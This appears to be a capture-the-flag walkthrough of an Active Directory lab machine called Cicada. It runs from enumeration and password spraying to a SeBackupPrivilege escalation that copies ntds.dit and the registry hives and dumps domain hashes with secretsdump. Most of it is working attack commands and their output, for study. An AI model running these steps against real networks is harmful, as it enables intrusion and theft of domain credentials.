# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.35
nmap -sU --top-ports=10 -vv 10.10.11.35

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-22 16:12:36Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| <SNIP>
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
<SNIP>
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
<SNIP>
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/22%Time=68075D94%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43674/tcp): CLEAN (Timeout)
|   Check 2 (port 42186/tcp): CLEAN (Timeout)
|   Check 3 (port 62917/udp): CLEAN (Timeout)
|   Check 4 (port 42686/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-22T16:13:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
	- SMB, kerberos, ssl, ldap, rpc, 
	- Domain : cicada.htb
	- common name (ssl) = CICADA-DC.cicada.htb
	- CA issuer: CICADA-DC-CA

## SMB Enumeration
- smbclient:
	```bash
smbclient -U '' -L //10.10.11.35 --password='' 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- netexec/crackmapexec
	```bash
netexec smb 10.10.11.35 -u '' -p '' --shares  

---OUTPUT---
^[[ASMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\: 
SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
	- Next Attempt
		```bash
netexec smb 10.10.11.35 -u 'guest' -p '' --shares  

---OUTPUT---
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```
- Login to HR Share as guest
	```bash
smbclient -U 'guest' //10.10.11.35/HR --password='' 
Try "help" to get a list of possible commands.
smb: \> dir
smb: \> get "Notice from HR.txt"

---OUTPUT-DIR---
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 481595 blocks available
```
- We find a password, a username (support) and important notes:
	```bash
cat Notice\ from\ HR.txt                                           

---OUTPUT---
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
- I tried logging in with rpc client and checked if I could pass some commands. Most were denied but I could lookup SID's which would allow me to RID bruteforce:
	```bash
rpcclient 10.10.11.35 -U 'guest%'
rpcclient $> enumdomusers
rpcclient $> lookupnames administrator
rpcclient $> lookupnames administrator
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-500
S-1-5-21-917908876-1423158569-3159038727-500 CICADA\Administrator (1)
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-1000
S-1-5-21-917908876-1423158569-3159038727-1000 CICADA\CICADA-DC$ (1)

---OUTPUT-ENUMDOMUSERS-FAIL---
result was NT_STATUS_ACCESS_DENIED

---OUTPUT-LOOKUPNAMES---
administrator S-1-5-21-917908876-1423158569-3159038727-500 (User: 1)
---OUTPUT-LOOKUPSIDS---
S-1-5-21-917908876-1423158569-3159038727-500 CICADA\Administrator (1)
S-1-5-21-917908876-1423158569-3159038727-1000 CICADA\CICADA-DC$ (1)

```
- We use impackets-lookupsids to RID brute force:
	```bash
impacket-lookupsid guest@10.10.11.35 -no-pass

---OUTPUT---
impacket-lookupsid guest@10.10.11.35 -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.10.11.35
[*] StringBinding ncacn_np:10.10.11.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```
- We then clean it a bit to grab just the users and save it to a file:
	```bash
impacket-lookupsid guest@10.10.11.35 -no-pass | grep "SidTypeUser"
impacket-lookupsid guest@10.10.11.35 -no-pass | grep "SidTypeUser" > userlist
---OUTPUT---
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1601: CICADA\emily.oscars (SidTypeUser)
```
- We do a bit more cleaning so it holds only the username:
	```bash
cat userlist| awk -F\\ '{print $2}' | awk  '{print $1}'
cat userlist| awk -F\\ '{print $2}' | awk  '{print $1}' > fixedusrelist


---OUTPUT---
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars

```
- I also save another userlist with the domain.
	```bash
cat userlist| awk -F: '{print $2}' | awk  '{print $1}'
cat userlist| awk -F: '{print $2}' | awk  '{print $1}' > fixeduserlist2

---OUTPUT---
CICADA\Administrator
CICADA\Guest
CICADA\krbtgt
CICADA\CICADA-DC$
CICADA\john.smoulder
CICADA\sarah.dantelia
CICADA\michael.wrightson
CICADA\david.orelious
CICADA\emily.oscars
```
- I think we can also remove CICADA-DC$ and krbtgt as there is little chance of cracking their password. ( i keep them anyway )
-  Tried to find a way to check password lockout threshold but couldn't find. (tried enum4linux, crackmapexec/netexec, ldapsearch)
- Attempted to use kerbrute to check pwds but fails
- I then use cracmapexec to share to check and get a hit:
	```bash
crackmapexec smb 10.10.11.35 -u fixeduserlist -p 'Cicada$M6Corpb*@Lp#nZp!8'

---RELEVANT-OUTPUT---
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```
	- I check shares and no extra privileges so can't check DEV share.
	- winrm doesn't give a hit
- I login with rpcclient to check if any more privileges:
	```bash
rpcclient 10.10.11.35 -U 'michael.wrightson'
Password for [WORKGROUP\michael.wrightson]:Cicada$M6Corpb*@Lp#nZp!8
rpcclient $> enumdomusers

---OUTPUT---
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.smoulder] rid:[0x450]
user:[sarah.dantelia] rid:[0x451]
user:[michael.wrightson] rid:[0x452]
user:[david.orelious] rid:[0x454]
user:[emily.oscars] rid:[0x641]
```
	- We have some extra privileges (as compared to guest)
- We also grab files for bloodhound:
	```bash
bloodhound-python --dns-tcp -ns 10.10.11.35 -d cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -c all
```
	- We mark michael.wrightson as owned but don't see any path to exploit.
	- Marked Admin as high value
	- See Emily Oscars user.
		- No path seen from user
- We try ldapsearch (initially tried without credentials and failed so anonymous auth doesn't work)
	```bash
ldapsearch -H ldap://10.10.11.35 -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" | grep "password"
--
ldapsearch -H ldap://10.10.11.35 -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" | grep "my password" -A10 -B10
---OUTPUT-1---
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Just in case I forget my password is aRt$Lp#7t*VQ!3

---OUTPUT-2---
msDS-SupportedEncryptionTypes: 0

# David Orelious, Users, cicada.htb
dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: David Orelious
sn: Orelious
description: Just in case I forget my password is aRt$Lp#7t*VQ!3
givenName: David
initials: D
distinguishedName: CN=David Orelious,CN=Users,DC=cicada,DC=htb
instanceType: 4
whenCreated: 20240314121729.0Z
whenChanged: 20240828172557.0Z
uSNCreated: 20569
uSNChanged: 122945
name: David Orelious
objectGUID:: vLT9wKgMqkOmSQuC/2CSVw==
```
	- We get new credentials: `david.orelious`:`aRt$Lp#7t*VQ!3`
	- **ALTERNATE METHOD**
		- We can use crackmapexec/netexec to find the password using the following command (from Ippsec)
			```bash
netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users


---RELEVANT-OUTPUT---
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3
```
			- `--users` enumerates all users in AD.
				- Also shows last pwd set time, bad password, descriptions etc which is how we got the pwd (description of david)
- We check with crackmapexec smb(fails for winrm)
	```bash
crackmapexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares

---OUTPUT---
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        [+] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
```
	- We get a hit and we have higher permissions and can access DEV share
- Accessing DEV share:
	```bash
smbclient -U 'cicada/david.orelious' //10.10.11.35/DEV --password='aRt$Lp#7t*VQ!3'

smb: \> dir
smb: \> get Backup_script.ps1 
smb: \> exit

---OUTPUT-DIR---
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 466440 blocks available

---OUTPUT-GET---
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
```
- We pass strings on Backup_script.ps1 (we can also `cat` it)
	```bash
strings Backup_script.ps1

---OUTPUT---
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
	- We get some credentials: `emily.oscars`:`Q!3@Lp#M6b*7t*Vt`
- We check with crackmapexec
	```bash
netexec winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 

---OUTPUT---
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```
	- We get a hit!
- We login with these credentials via evil-winrm
	```bash
evil-winrm -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35

---OUTPUT---
 
Evil-WinRM shell v3.7
  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
```
	- We grab user flag.
	- Alternatively if we checked read/write privileges for smb for this user we would see we have read write access to C drive which we can then access with smb to grab the user flag located on Emily's Desktop directory there
## Privilege Escalation
- We pass this command and find a vulnerable backup privilege:
	```bash
whoami /priv

---OUTPUT---
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
	- SeBackupPrivilege and SeRestorePrivilege
- I fuse this link to exploit:
	- https://github.com/k4sth4/SeBackupPrivilege
- I download the modules and create the vss.dsh file
	```bash
cat vss.dsh

---OUTPUT---
set context persistent nowriters
set metadata c:\\programdata\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```
- I create a folder temp in C: and upload the files
	```powershell
mkdir C:\temp
cd C:\temp
upload vss.dsh
upload SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll
```
- Then i pass the exploit commands improting the module and creating a shadow disk with diskshadow command:
	```bash
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
diskshadow /s vss.dsh

---OUTPUT---
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  CICADA-DC,  4/22/2025 3:52:48 PM

-> set context persistent nowriters
-> set metadata c:\\programdata\\test.cab
-> set verbose on
-> add volume c: alias test
-> create

Alias test for shadow ID {3165c2eb-2856-473c-a787-b94d196a8d7b} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {03a02713-a12b-4655-b192-162a4aa8ae37} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file DisA12F.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {03a02713-a12b-4655-b192-162a4aa8ae37}

        * Shadow copy ID = {3165c2eb-2856-473c-a787-b94d196a8d7b}               %test%
                - Shadow copy set: {03a02713-a12b-4655-b192-162a4aa8ae37}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{fcebaf9b-0000-0000-0000-500600000000}\ [C:\]
                - Creation time: 4/22/2025 3:52:49 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: CICADA-DC.cicada.htb
                - Service machine: CICADA-DC.cicada.htb
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %test% z:
-> %test% = {3165c2eb-2856-473c-a787-b94d196a8d7b}
The shadow copy was successfully exposed as z:\.
```
	- To check we can change to Z: directory to see if it exists
- Then we grab the ntds.dit and SYSTEM hive and download it
	```bash
Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\temp\\ntds.dit
--
reg save HKLM\SYSTEM C:\\temp\\SYSTEM
--
# Can also
reg save HKLM\SAM C:\\temp\\SAN
-- 
cd C:\temp
download SYSTEM
download ntds.dit
download SAM
```
- Finally we attempt to crack it :
	```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
--OR--
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

---OUTPUT-1--
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
